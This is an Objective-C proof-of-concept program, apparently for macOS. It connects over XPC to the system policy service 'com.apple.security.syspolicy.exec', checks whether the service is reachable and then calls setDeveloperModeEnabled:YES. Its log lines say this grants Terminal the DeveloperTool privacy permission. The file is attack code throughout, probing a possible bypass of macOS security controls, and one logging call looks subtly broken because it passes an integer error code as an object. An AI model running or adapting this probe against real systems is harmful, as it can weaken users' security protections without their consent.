#import <Foundation/Foundation.h>
@protocol ExecManagerRemote
- (void)doGatekeeperProgressUpdate:(long long)a withTotal:(long long)b;
@end
@protocol ExecManager
- (void)isDeveloperModeEnabledWithReply:(void(^)(BOOL enabled))reply;
- (void)setDeveloperModeEnabled:(BOOL)enabled withReply:(void(^)(void))reply;
@end
@interface Cb : NSObject <ExecManagerRemote> @end
@implementation Cb - (void)doGatekeeperProgressUpdate:(long long)a withTotal:(long long)b { NSLog(@"[cb] progress %lld/%lld", a, b); } @end
int main(){ @autoreleasepool {
  NSLog(@"[*] uid=%d", getuid());
  NSXPCConnection *c=[[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.security.syspolicy.exec" options:0];
  c.remoteObjectInterface=[NSXPCInterface interfaceWithProtocol:@protocol(ExecManager)];
  c.exportedInterface=[NSXPCInterface interfaceWithProtocol:@protocol(ExecManagerRemote)];
  c.exportedObject=[Cb new];
  __block BOOL inval=NO;
  c.invalidationHandler=^{ inval=YES; NSLog(@"[!] INVALIDATED(4099=rejected)"); };
  c.interruptionHandler=^{ NSLog(@"[!] INTERRUPTED(4097)"); };
  [c resume];
  dispatch_semaphore_t s=dispatch_semaphore_create(0);
  id r=[c remoteObjectProxyWithErrorHandler:^(NSError*e){ NSLog(@"[xpc-err] %@", e.code); dispatch_semaphore_signal(s); }];
  NSLog(@"[1] isDeveloperModeEnabledWithReply: ...");
  [r isDeveloperModeEnabledWithReply:^(BOOL en){ NSLog(@"[1>] REACHABLE reply=%d", en); dispatch_semaphore_signal(s); }];
  dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, 8*NSEC_PER_SEC));
  NSLog(@"[2] setDeveloperModeEnabled:YES (grants Terminal TCC DeveloperTool on enable)...");
  [r setDeveloperModeEnabled:YES withReply:^{ NSLog(@"[2>] setDeveloperModeEnabled reply"); dispatch_semaphore_signal(s); }];
  dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, 8*NSEC_PER_SEC));
  sleep(1); NSLog(@"[*] done inval=%d", inval);
  return 0;
}}
